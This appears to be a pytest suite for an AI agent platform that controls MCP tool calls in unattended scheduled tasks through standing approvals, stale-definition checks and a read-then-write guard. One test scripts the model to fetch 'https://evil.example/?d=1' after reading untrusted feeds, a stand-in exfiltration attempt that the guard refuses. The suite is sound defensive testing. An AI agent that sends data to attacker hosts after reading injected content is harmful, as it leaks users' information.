"""Tests: tools in a scheduled task's turn, where nobody can answer a confirmation.
The chat model is a scripted HTTP server (this repo's test conventions); the MCP servers are
the real built-in subprocesses. A "confirm" tool is refused in a task turn unless the task holds
a standing approval for it, bound to the definition the user approved; read-then-write
is never approved in advance.
"""

import json
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

import pytest
from sqlalchemy import select

from app import tools as tools_module
from app.db.models import Channel, McpCall

KEY = "Zq8vT3mK9xW2pL7nR4bY6cH1dF5gJ0sA"


class _Scripted(BaseHTTPRequestHandler):
    responses: list = []
    requests: list = []

    def log_message(self, *a):
        pass

    def do_POST(self):
        raw = self.rfile.read(int(self.headers.get("Content-Length", 0)))
        if self.path != "/v1/chat/completions":
            self.send_response(404)
            self.send_header("Content-Length", "0")
            self.end_headers()
            return
        body = json.loads(raw)
        type(self).requests.append(body)
        if body.get("tool_choice") == "required":
            payload = _message(tool_calls=[_call("_capability_probe", {}, "probe")])
        else:
            payload = type(self).responses.pop(0)
        data = json.dumps(payload).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)


def _message(content="", tool_calls=None):
    message = {"role": "assistant", "content": content}
    if tool_calls is not None:
        message["tool_calls"] = tool_calls
    return {"choices": [{"message": message}]}


def _call(name, arguments, call_id="call-1"):
    return {"id": call_id, "type": "function",
            "function": {"name": name, "arguments": json.dumps(arguments)}}  # fmt: skip


@pytest.fixture
async def env(fresh_db, monkeypatch):
    """Sam (Telegram 555, chat permission) with the built-in servers `time` and `web`
    declared, approved and granted; the delivery of task results is captured."""
    import httpx

    from app.api import deps
    from app.api.app import app
    from app.channels import notify
    from app.config import get_settings
    from app.db.session import init_db

    _Scripted.requests, _Scripted.responses = [], []
    server = HTTPServer(("127.0.0.1", 0), _Scripted)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    monkeypatch.setenv("LLAMA_SERVER_URL", f"http://127.0.0.1:{server.server_port}")
    monkeypatch.setenv("API_SERVER_KEY", KEY)
    get_settings.cache_clear()
    deps.reset_failure_state()
    tools_module.reset_capability_check()
    await init_db()
    delivered: list[tuple[str, str]] = []

    async def sender(external_id, text):
        delivered.append((external_id, text))

    notify.register_sender(Channel.TELEGRAM, sender)
    transport = httpx.ASGITransport(app=app, raise_app_exceptions=False)
    headers = {"Authorization": f"Bearer {KEY}"}
    async with httpx.AsyncClient(transport=transport, base_url="http://t", headers=headers) as api:
        api.user = (await api.post("/users", json={"display_name": "Sam"})).json()["id"]
        identity = await api.post(
            f"/users/{api.user}/channels", json={"channel": "telegram", "identifier": "555"}
        )
        api.identity = identity.json()["id"]
        await api.post(
            f"/users/{api.user}/channels/{api.identity}/permissions", json={"kind": "chat"}
        )
        api.servers = {}
        for name in ("time", "web"):
            created = await api.post(
                "/mcp/servers", json={"name": name, "protocol": "stdio", "builtin_id": name}
            )
            api.servers[name] = created.json()["id"]
            server_id = api.servers[name]
            approved = await api.post(f"/mcp/servers/{server_id}/approve-definitions", json={})
            assert approved.status_code == 200, approved.text
        await api.put(
            "/mcp/grants",
            json={"user_id": api.user, "grants": [{"server_name": "time"}, {"server_name": "web"}]},
        )
        api.delivered = delivered
        yield api
    from app.mcp.manager import manager as shared_manager

    notify.unregister_sender(Channel.TELEGRAM)
    await shared_manager.reset()
    app.dependency_overrides.clear()
    server.shutdown()
    get_settings.cache_clear()
    deps.reset_failure_state()
    tools_module.reset_capability_check()


async def _agent_and_task(env, tools, **task_fields) -> tuple[int, int]:
    agent = await env.post(f"/users/{env.user}/agents", json={"name": "news", "tools": tools})
    assert agent.status_code == 201, agent.text
    task = await env.post(
        "/tasks",
        json={"user_id": env.user, "agent_id": agent.json()["id"], "prompt": "The news.",
              "kind": "daily", "expr": "09:00", "channel_identity_id": env.identity,
              **task_fields},
    )  # fmt: skip
    assert task.status_code == 201, task.text
    return agent.json()["id"], task.json()["id"]


async def _calls() -> list[tuple[str, str, str]]:
    from app.db.session import session_scope

    async with session_scope() as session:
        rows = (await session.execute(select(McpCall).order_by(McpCall.id))).scalars()
        return [(r.tool_name, r.decision, r.status) for r in rows]


async def test_a_task_turn_calling_fetch_page_is_refused_no_channel(env):
    """The state without approval, kept as the case without a standing approval: fetch_page is
    read-only but open-world, so its default policy is confirm, and a task turn has nobody
    to ask. Refused before any request leaves (no network in this test)."""
    from app import tasks

    _agent_id, task_id = await _agent_and_task(env, ["mcp__web__fetch_page"])
    _Scripted.responses = [
        _message(tool_calls=[_call("mcp__web__fetch_page", {"url": "https://example.org/"})]),
        _message(content="I could not read the page."),
    ]
    result = await tasks.execute(task_id, trigger="manual")
    calls = await _calls()
    print(result, calls)
    assert calls == [("fetch_page", "no_channel", "refused")]
    assert result["status"] == "ok"
    tool_message = next(m for m in _Scripted.requests[-1]["messages"] if m.get("role") == "tool")
    assert "nobody can be asked here" in tool_message["content"]


async def _confirm_policy(env, classes=None):
    """time.get_time is allow by default (read-only, closed-world): made confirm, so a task
    turn needs a standing approval for it."""
    body = {"policy": "confirm", **({"classes": classes} if classes else {})}
    changed = await env.patch(f"/mcp/servers/{env.servers['time']}/tools/get_time", json=body)
    assert changed.status_code == 200, changed.text


def _get_time(zone="UTC", call_id="call-1"):
    return _call("mcp__time__get_time", {"timezone": zone}, call_id)


async def test_a_standing_approval_runs_the_confirm_tool_in_a_task_turn(env):
    from app import tasks
    from app.mcp.confirm import current_standing

    await _confirm_policy(env)
    _agent, task_id = await _agent_and_task(
        env, ["mcp__time__get_time"], standing_tools=["mcp__time__get_time"]
    )
    _Scripted.responses = [_message(tool_calls=[_get_time()]), _message(content="It is time.")]
    result = await tasks.execute(task_id, trigger="manual")
    assert await _calls() == [("get_time", "standing", "ok")]
    tool_message = next(m for m in _Scripted.requests[-1]["messages"] if m.get("role") == "tool")
    assert "untrusted data" in tool_message["content"], "the real server answered"
    assert result["status"] == "ok" and current_standing.get() is None


async def test_without_the_approval_the_same_task_is_refused(env):
    from app import tasks

    await _confirm_policy(env)
    _agent, task_id = await _agent_and_task(env, ["mcp__time__get_time"])
    _Scripted.responses = [_message(tool_calls=[_get_time()]), _message(content="No clock.")]
    await tasks.execute(task_id, trigger="manual")
    assert await _calls() == [("get_time", "no_channel", "refused")]


async def test_a_chat_turn_never_uses_a_tasks_approval(env):
    from app.graph import run_turn

    await _confirm_policy(env)
    agent_id, _task = await _agent_and_task(
        env, ["mcp__time__get_time"], standing_tools=["mcp__time__get_time"]
    )
    _Scripted.responses = [_message(tool_calls=[_get_time()]), _message(content="No clock.")]
    await run_turn(Channel.TELEGRAM, "555", agent_id, "what time is it?")
    assert await _calls() == [("get_time", "no_channel", "refused")]


async def test_after_untrusted_content_an_outbound_tool_is_refused_even_if_approved(env):
    from app import tasks

    await _confirm_policy(env, classes={"untrusted": True, "outbound": True})
    _agent, task_id = await _agent_and_task(
        env, ["mcp__time__get_time"], standing_tools=["mcp__time__get_time"]
    )
    _Scripted.responses = [
        _message(tool_calls=[_get_time("UTC", "c1")]),
        _message(tool_calls=[_get_time("Europe/Paris", "c2")]),
        _message(content="Done."),
    ]
    await tasks.execute(task_id, trigger="manual")
    assert await _calls() == [("get_time", "standing", "ok"), ("get_time", "no_channel", "refused")]


async def test_a_second_address_named_by_the_task_is_read_after_untrusted_content(env):
    """Fetch_page of an internet server is outbound, so after the first page any read was
    refused (the owner's digest read 1 feed of 2). A read-only tool may read again an address
    the task's prompt names; an address it does not name stays refused."""
    from app import tasks

    changed = await env.patch(f"/mcp/servers/{env.servers['web']}", json={"egress": "internet"})
    assert changed.status_code == 200, changed.text
    _agent, task_id = await _agent_and_task(
        env, ["mcp__web__fetch_page"], standing_tools=["mcp__web__fetch_page"],
        prompt="Read https://a.example/feed and https://b.example/feed.",
    )  # fmt: skip

    def fetch(url, call_id):
        return _message(tool_calls=[_call("mcp__web__fetch_page", {"url": url}, call_id)])

    _Scripted.responses = [
        fetch("https://a.example/feed", "c1"),
        fetch("https://b.example/feed", "c2"),
        fetch("https://evil.example/?d=1", "c3"),
        _message(content="Digest."),
    ]
    await tasks.execute(task_id, trigger="manual")
    decisions = [(tool, decision) for tool, decision, _status in await _calls()]
    assert decisions == [
        ("fetch_page", "standing"),
        ("fetch_page", "standing"),
        ("fetch_page", "no_channel"),
    ]


def test_only_a_read_only_tool_rereads_an_address_the_task_names():
    from app.mcp.catalogue import Offered, _named_reread
    from app.mcp.confirm import current_task_addresses
    from app.mcp.policy import Policy

    reader = Offered("web", "fetch_page", Policy.CONFIRM, read_only=True)
    writer = Offered("web", "post_form", Policy.CONFIRM, read_only=False)
    named = {"url": "https://a.example/feed"}
    assert not _named_reread(reader, named), "outside a task turn, never"
    token = current_task_addresses.set(frozenset({"https://a.example/feed"}))
    try:
        assert _named_reread(reader, named)
        assert not _named_reread(writer, named), "a tool that changes something, never"
        assert not _named_reread(reader, {"url": "https://a.example/feed?x=secret"})
        assert not _named_reread(reader, {"query": "no address"})
        assert not _named_reread(reader, {**named, "next": "https://evil.example/"})
    finally:
        current_task_addresses.reset(token)


def test_the_addresses_of_a_task_prompt():
    from app.mcp.confirm import prompt_addresses

    assert prompt_addresses(
        "Lis https://a.example/feed.xml, puis https://b.example/x?y=1. Et (http://c.example/)"
    ) == {"https://a.example/feed.xml", "https://b.example/x?y=1", "http://c.example/"}
    assert prompt_addresses("No address here.") == frozenset()


async def test_a_replaced_definition_voids_the_approval_until_the_user_agrees_again(env):
    from app import tasks
    from app.db.models import ScheduledTask
    from app.db.session import session_scope

    await _confirm_policy(env)
    _agent, task_id = await _agent_and_task(
        env, ["mcp__time__get_time"], standing_tools=["mcp__time__get_time"]
    )
    # The approval was given for an earlier definition, which an administrator has replaced.
    async with session_scope() as session:
        task = await session.get(ScheduledTask, task_id)
        task.standing_tools = {"mcp__time__get_time": "0" * 64}
        await session.commit()
    shown = (await env.get(f"/tasks/{task_id}")).json()
    assert (shown["standing_tools"], shown["standing_stale"]) == ([], ["mcp__time__get_time"])
    exposure = (await env.get(f"/agents/{_agent}/exposure")).json()["tools"][0]
    assert (exposure["standing_tasks"], exposure["standing_stale"]) == ([], [task_id])

    _Scripted.responses = [_message(tool_calls=[_get_time()]), _message(content="No clock.")]
    await tasks.execute(task_id, trigger="manual")
    assert await _calls() == [("get_time", "stale_approval", "refused")]
    tool_message = next(m for m in _Scripted.requests[-1]["messages"] if m.get("role") == "tool")
    assert "must approve it again" in tool_message["content"]

    agreed = await env.patch(f"/tasks/{task_id}", json={"standing_tools": ["mcp__time__get_time"]})
    assert agreed.json()["standing_tools"] == ["mcp__time__get_time"]
    exposure = (await env.get(f"/agents/{_agent}/exposure")).json()["tools"][0]
    assert (exposure["standing_tasks"], exposure["standing_stale"]) == ([task_id], [])
    _Scripted.responses = [_message(tool_calls=[_get_time()]), _message(content="It is time.")]
    await tasks.execute(task_id, trigger="manual")
    assert (await _calls())[-1] == ("get_time", "standing", "ok")


async def test_a_standing_approval_needs_a_tool_of_the_agent_with_an_approved_definition(env):
    agent = await env.post(
        f"/users/{env.user}/agents",
        json={"name": "news", "tools": ["mcp__time__get_time", "mcp__nowhere__x"]},
    )
    base = {"user_id": env.user, "agent_id": agent.json()["id"], "prompt": "p", "kind": "daily",
            "expr": "09:00", "channel_identity_id": env.identity}  # fmt: skip
    other = await env.post("/tasks", json={**base, "standing_tools": ["mcp__web__fetch_page"]})
    unapproved = await env.post("/tasks", json={**base, "standing_tools": ["mcp__nowhere__x"]})
    assert other.status_code == 422 and "is not an MCP tool of agent" in other.json()["detail"]
    assert unapproved.status_code == 422 and "no approved definition" in unapproved.json()["detail"]
    ok = await env.post("/tasks", json={**base, "standing_tools": ["mcp__time__get_time"]})
    assert ok.status_code == 201 and ok.json()["standing_tools"] == ["mcp__time__get_time"]


async def test_moving_a_task_to_another_agent_drops_its_approval(env):
    _agent, task_id = await _agent_and_task(
        env, ["mcp__time__get_time"], standing_tools=["mcp__time__get_time"]
    )
    other = await env.post(
        f"/users/{env.user}/agents", json={"name": "other", "tools": ["mcp__time__get_time"]}
    )
    moved = await env.patch(f"/tasks/{task_id}", json={"agent_id": other.json()["id"]})
    assert moved.status_code == 200 and moved.json()["standing_tools"] == []


# --- the decision itself ---


@pytest.mark.parametrize(
    ("standing", "confirmer", "read_then_write", "expected"),
    [
        ({"mcp__time__get_time": "h"}, None, False, "standing"),
        ({"mcp__time__get_time": "old"}, None, False, "stale_approval"),
        ({"mcp__other__tool": "h"}, None, False, None),  # another tool's approval
        ({}, None, False, None),
        (None, None, False, None),  # a chat turn: no approval at all
        ({"mcp__time__get_time": "h"}, "someone", False, None),  # someone can answer: asked
        ({"mcp__time__get_time": "h"}, None, True, None),  # read-then-write
    ],
)
def test_the_standing_decision(standing, confirmer, read_then_write, expected):
    from app.mcp import catalogue
    from app.mcp.confirm import current_confirmer, current_standing
    from app.mcp.policy import Policy

    async def ask(question, timeout):
        return True

    offered = catalogue.Offered("time", "get_time", Policy.CONFIRM, {}, "h")
    tokens = (current_standing.set(standing), current_confirmer.set(ask if confirmer else None))
    try:
        decision = catalogue._standing("mcp__time__get_time", offered, read_then_write)
    finally:
        current_standing.reset(tokens[0])
        current_confirmer.reset(tokens[1])
    assert (decision.value if decision else None) == expected


# --- how long an engine request may take ---


async def test_a_task_turn_uses_the_task_timeout_and_a_chat_turn_does_not(env, monkeypatch):
    import app.graph
    from app import tasks
    from app.config import get_settings

    monkeypatch.setenv("LLM_TASK_TIMEOUT_SECONDS", "42")
    get_settings.cache_clear()
    seen = []

    async def fake_run_turn(channel, user_id, agent_id, text, **kwargs):
        seen.append(app.graph.llm_timeout.get())
        return "ok"

    monkeypatch.setattr(app.graph, "run_turn", fake_run_turn)
    _agent, task_id = await _agent_and_task(env, [])
    await tasks.execute(task_id, trigger="manual")
    assert seen == [42] and app.graph.llm_timeout.get() is None


async def test_the_engine_request_gets_the_turns_timeout(monkeypatch):
    import app.graph as graph

    timeouts = []

    class Stop(Exception):
        pass

    def client(**kwargs):
        timeouts.append(kwargs["timeout"])
        raise Stop

    monkeypatch.setattr(graph.httpx, "AsyncClient", client)
    state = {"messages": [], "summary": "", "summary_covers": 0}
    with pytest.raises(Stop):
        await graph.call_llm(state)
    token = graph.llm_timeout.set(600)
    try:
        with pytest.raises(Stop):
            await graph.call_llm(state)
    finally:
        graph.llm_timeout.reset(token)
    assert timeouts == [graph.CHAT_LLM_TIMEOUT, 600] == [120, 600]


async def test_an_untrusted_read_only_tool_may_be_read_again_under_its_approval(env):
    """Found this: after a first untrusted result, a second call to a read-only tool was
    refused although approved; read-then-write concerns outbound tools only."""
    from app import tasks

    await _confirm_policy(env, classes={"untrusted": True, "outbound": False})
    _agent, task_id = await _agent_and_task(
        env, ["mcp__time__get_time"], standing_tools=["mcp__time__get_time"]
    )
    _Scripted.responses = [
        _message(tool_calls=[_get_time("UTC", "c1")]),
        _message(tool_calls=[_get_time("Europe/Paris", "c2")]),
        _message(content="Done."),
    ]
    await tasks.execute(task_id, trigger="manual")
    assert await _calls() == [("get_time", "standing", "ok"), ("get_time", "standing", "ok")]
